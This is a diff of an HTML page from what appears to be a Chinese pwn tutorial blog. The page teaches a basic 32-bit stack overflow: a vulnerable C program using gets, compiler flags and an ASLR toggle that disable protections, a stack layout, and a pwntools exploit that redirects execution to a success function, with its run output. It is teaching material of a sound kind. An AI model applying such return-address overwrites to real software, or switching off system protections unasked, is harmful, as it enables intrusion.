@@ -693,41 +693,41 @@
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e5%9f%ba%e6%9c%ac%e7%a4%ba%e4%be%8b-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_3" style="text-decoration-line: none !important;">#</a></span>
 </h4>
 <p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-void success() { puts("You Hava already controlled it."); }
-void vulnerable() {
-  char s[12];
-  gets(s);
-  puts(s);
-  return;
-}
-int main(int argc, char **argv) {
-  vulnerable();
-  return 0;
-}
-</code></pre><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &lt;stdio.h&gt;
+</span></span><span class="line"><span class="cl">#include &lt;string.h&gt;
+</span></span><span class="line"><span class="cl">void success() { puts("You Hava already controlled it."); }
+</span></span><span class="line"><span class="cl">void vulnerable() {
+</span></span><span class="line"><span class="cl">  char s[12];
+</span></span><span class="line"><span class="cl">  gets(s);
+</span></span><span class="line"><span class="cl">  puts(s);
+</span></span><span class="line"><span class="cl">  return;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">int main(int argc, char **argv) {
+</span></span><span class="line"><span class="cl">  vulnerable();
+</span></span><span class="line"><span class="cl">  return 0;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
 <p>我们利用如下命令对其进行编译</p>
-<pre tabindex="0"><code>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
-stack_example.c: In function ‘vulnerable’:
-stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
-   gets(s);
-   ^
-/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
-stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
-</code></pre><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
+</span></span><span class="line"><span class="cl">stack_example.c: In function ‘vulnerable’:
+</span></span><span class="line"><span class="cl">stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
+</span></span><span class="line"><span class="cl">   gets(s);
+</span></span><span class="line"><span class="cl">   ^
+</span></span><span class="line"><span class="cl">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
+</span></span><span class="line"><span class="cl">stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
+</span></span></code></pre></div><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
 <blockquote>
 <p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
 </blockquote>
 <p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
 <p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
-<pre tabindex="0"><code>➜  stack-example checksec stack_example
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-</code></pre><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  stack-example checksec stack_example
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x8048000)
+</span></span></code></pre></div><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
 <ul>
 <li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
 <li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
@@ -736,81 +736,81 @@ stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and sho
 <p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
 <p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
 <p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
-<pre tabindex="0"><code>int vulnerable()
-{
-  char s; // [sp+4h] [bp-14h]@1
-
-  gets(&amp;s);
-  return puts(&amp;s);
-}
-</code></pre><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
-<pre tabindex="0"><code>                                           +-----------------+
-                                           |     retaddr     |
-                                           +-----------------+
-                                           |     saved ebp   |
-                                    ebp---&gt;+-----------------+
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                              s,ebp-0x14--&gt;+-----------------+
-</code></pre><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
-<pre tabindex="0"><code>.text:0804843B success         proc near
-.text:0804843B                 push    ebp
-.text:0804843C                 mov     ebp, esp
-.text:0804843E                 sub     esp, 8
-.text:08048441                 sub     esp, 0Ch
-.text:08048444                 push    offset s        ; "You Hava already controlled it."
-.text:08048449                 call    _puts
-.text:0804844E                 add     esp, 10h
-.text:08048451                 nop
-.text:08048452                 leave
-.text:08048453                 retn
-.text:08048453 success         endp
-</code></pre><p>那么如果我们读取的字符串为</p>
-<pre tabindex="0"><code>0x14*'a'+'bbbb'+success_addr
-</code></pre><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
-<pre tabindex="0"><code>                                           +-----------------+
-                                           |    0x0804843B   |
-                                           +-----------------+
-                                           |       bbbb      |
-                                    ebp---&gt;+-----------------+
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                                           |                 |
-                              s,ebp-0x14--&gt;+-----------------+
-</code></pre><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
-<pre tabindex="0"><code>\x3b\x84\x04\x08
-</code></pre><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
-<pre tabindex="0"><code>##coding=utf8
-from pwn import *
-## 构造与程序交互的对象
-sh = process('./stack_example')
-success_addr = 0x0804843b
-## 构造payload
-payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
-print p32(success_addr)
-## 向程序发送字符串
-sh.sendline(payload)
-## 将代码交互转换为手工交互
-sh.interactive()
-</code></pre><p>执行一波代码，可以得到</p>
-<pre tabindex="0"><code>➜  stack-example python exp.py
-[+] Starting local process './stack_example': pid 61936
-;\x84\x0
-[*] Switching to interactive mode
-aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
-You Hava already controlled it.
-[*] Got EOF while reading in interactive
-$ 
-[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
-[*] Got EOF while sending in interactive
-</code></pre><p>可以看到我们确实已经执行 success 函数。</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">int vulnerable()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  char s; // [sp+4h] [bp-14h]@1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  gets(&amp;s);
+</span></span><span class="line"><span class="cl">  return puts(&amp;s);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
+</span></span><span class="line"><span class="cl">                                           |     retaddr     |
+</span></span><span class="line"><span class="cl">                                           +-----------------+
+</span></span><span class="line"><span class="cl">                                           |     saved ebp   |
+</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
+</span></span></code></pre></div><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.text:0804843B success         proc near
+</span></span><span class="line"><span class="cl">.text:0804843B                 push    ebp
+</span></span><span class="line"><span class="cl">.text:0804843C                 mov     ebp, esp
+</span></span><span class="line"><span class="cl">.text:0804843E                 sub     esp, 8
+</span></span><span class="line"><span class="cl">.text:08048441                 sub     esp, 0Ch
+</span></span><span class="line"><span class="cl">.text:08048444                 push    offset s        ; "You Hava already controlled it."
+</span></span><span class="line"><span class="cl">.text:08048449                 call    _puts
+</span></span><span class="line"><span class="cl">.text:0804844E                 add     esp, 10h
+</span></span><span class="line"><span class="cl">.text:08048451                 nop
+</span></span><span class="line"><span class="cl">.text:08048452                 leave
+</span></span><span class="line"><span class="cl">.text:08048453                 retn
+</span></span><span class="line"><span class="cl">.text:08048453 success         endp
+</span></span></code></pre></div><p>那么如果我们读取的字符串为</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x14*'a'+'bbbb'+success_addr
+</span></span></code></pre></div><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
+</span></span><span class="line"><span class="cl">                                           |    0x0804843B   |
+</span></span><span class="line"><span class="cl">                                           +-----------------+
+</span></span><span class="line"><span class="cl">                                           |       bbbb      |
+</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                                           |                 |
+</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
+</span></span></code></pre></div><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x3b\x84\x04\x08
+</span></span></code></pre></div><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">##coding=utf8
+</span></span><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">## 构造与程序交互的对象
+</span></span><span class="line"><span class="cl">sh = process('./stack_example')
+</span></span><span class="line"><span class="cl">success_addr = 0x0804843b
+</span></span><span class="line"><span class="cl">## 构造payload
+</span></span><span class="line"><span class="cl">payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
+</span></span><span class="line"><span class="cl">print p32(success_addr)
+</span></span><span class="line"><span class="cl">## 向程序发送字符串
+</span></span><span class="line"><span class="cl">sh.sendline(payload)
+</span></span><span class="line"><span class="cl">## 将代码交互转换为手工交互
+</span></span><span class="line"><span class="cl">sh.interactive()
+</span></span></code></pre></div><p>执行一波代码，可以得到</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  stack-example python exp.py
+</span></span><span class="line"><span class="cl">[+] Starting local process './stack_example': pid 61936
+</span></span><span class="line"><span class="cl">;\x84\x0
+</span></span><span class="line"><span class="cl">[*] Switching to interactive mode
+</span></span><span class="line"><span class="cl">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
+</span></span><span class="line"><span class="cl">You Hava already controlled it.
+</span></span><span class="line"><span class="cl">[*] Got EOF while reading in interactive
+</span></span><span class="line"><span class="cl">$ 
+</span></span><span class="line"><span class="cl">[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
+</span></span><span class="line"><span class="cl">[*] Got EOF while sending in interactive
+</span></span></code></pre></div><p>可以看到我们确实已经执行 success 函数。</p>
 <br/>
 <hr/>
 <p>小总结 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_4" target="_blank">
@@ -1286,7 +1286,7 @@ s 离返回地址的距离为0x14 - 0x0 = 20
 </div>
 <div class="text-sm text-neutral-500 dark:text-neutral-400">
 <div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-07-14 00:00:00 +0000 UTC">July 14, 2023</time><span class="px-2 text-primary-500">·</span><span>4902 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">10 分钟</span>
+<time datetime="2023-07-14 00:00:00 +0000 UTC">July 14, 2023</time><span class="px-2 text-primary-500">·</span><span>4854 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">10 分钟</span>
 </div>
 <div class="flex flex-row flex-wrap items-center">
 <span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
@@ -1408,7 +1408,7 @@ s 离返回地址的距离为0x14 - 0x0 = 20
 <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/pwn/basic/linux_/">Linux命令入门与总结</div>
 <div class="text-sm text-neutral-500 dark:text-neutral-400">
 <div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-07-14 00:00:00 +0000 UTC">July 14, 2023</time><span class="px-2 text-primary-500">·</span><span>4902 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">10 分钟</span>
+<time datetime="2023-07-14 00:00:00 +0000 UTC">July 14, 2023</time><span class="px-2 text-primary-500">·</span><span>4854 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">10 分钟</span>
 </div>
 <div class="flex flex-row flex-wrap items-center">
 <span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
